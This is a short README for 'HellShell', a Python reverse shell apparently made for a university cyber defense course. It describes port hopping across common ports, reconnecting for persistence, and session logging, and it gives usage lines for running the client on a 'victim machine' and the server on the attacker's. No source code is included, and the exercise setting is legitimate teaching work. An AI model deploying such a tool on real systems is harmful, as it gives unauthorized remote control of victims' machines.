# hellshell
Reverse shell for CDT (CSEC 473)

HellShell is a Python interactive reverse shell using TCP sockets. Pipes can be opened on common ports, such as 80, 8080, 443, 20, 21, and 23. Pipes are torn down and re-established on new ports when an error occurs - like a broken pipe - and after a specified timeout from inactivity, for persistence's sake. Run the HellShell client on the victim machine, and when you're ready to open your HellShell, run the server on your machine. A connection will be established from the client side, trying all ports until an open one is found. Each session is written to a log file, for easy review of information you recover with HellShell.

Usage:
  [ for client ] python3 blue.py <server_ip>
  [ for server ] python3 red.py

Commands:
  porthop - jump to the next port in the list, or wrap around
  endme - gracefully close the shell and stop the server
